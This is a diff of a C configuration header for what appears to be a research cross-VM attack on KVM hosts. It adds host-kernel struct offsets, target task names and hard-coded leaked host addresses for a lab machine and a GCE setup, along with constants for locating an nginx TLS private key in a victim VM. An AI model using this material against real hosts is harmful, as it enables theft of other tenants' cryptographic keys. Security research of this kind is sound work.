@@ -37,12 +37,21 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define SSLKEY_LEN		(128 + 4 + 128) // prime1 + magic + prime2
 #define SSLKEY_MAGIC		0x00818102
 
+#if MACHINE == FATHER
+#undef G_MM_HEAP
+#undef NGINX_SSLKEY
+#define G_MM_HEAP		0x158 + 0x10 // start_arg
+#define NGINX_SSLKEY		0x0  // start of arg
+#endif
+
 
 /******************************************************************************
  ************************  Victim Host Kernel Layout  *************************
  ******************************************************************************/
 
 #if MACHINE == FATHER
+
+#define OWN_TASK_NAME		"qemu-system-x86"
 
 // struct kvm_apic_map {
 #define H_MAP_PHYS_MAP		0x218	// struct kvm_lapic *phys_map[max_apic_id+1]
@@ -100,6 +109,8 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 // };
 
 #elif MACHINE == GCE
+
+#define OWN_TASK_NAME		"VCPU-0"
 
 // struct kvm_apic_map {
 #define H_MAP_PHYS_MAP		0x218   // struct kvm_lapic *phys_map[max_apic_id+1]
@@ -163,9 +174,19 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
  ************************  Previously Leaked Results  *************************
  ******************************************************************************/
 
-#if LEAK == SKIP
+#if LEAK == SKIP || LEAK == CHEAT_NOISY
 
 #if MACHINE == FATHER
+#define BASE		0x2dd2ae218
+#define HOST_DIRECT_MAP	0xffffa03300000000
+#define OWN_VCPU	0xffffa03509eea300
+#define OWN_TASK	0xffffa0340565afb0
+#define HCR3		0x426d18000
+#define VICTIM_VCPU	0xffffa03509694600
+#define EPTP		0x10209e000
+#define GCR3		0x279a42000
+#define GTEXT		0xffffffffa7c00000
+#define NGINX		0x1f93dc100
 #elif MACHINE == GCE
 #define BASE 0x88d43f218
 #define OWN_TASK 0xffff936a91dba000
@@ -173,7 +194,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define BASE 0xa1d34218
 #endif // MACHINE
 
-#elif LEAK == CHEAT
+#elif LEAK == CHEAT || LEAK == CHEAT_NOISY
 
 #define BASE (helper_base_pa())
 #define HOST_DIRECT_MAP (hc_direct_map())
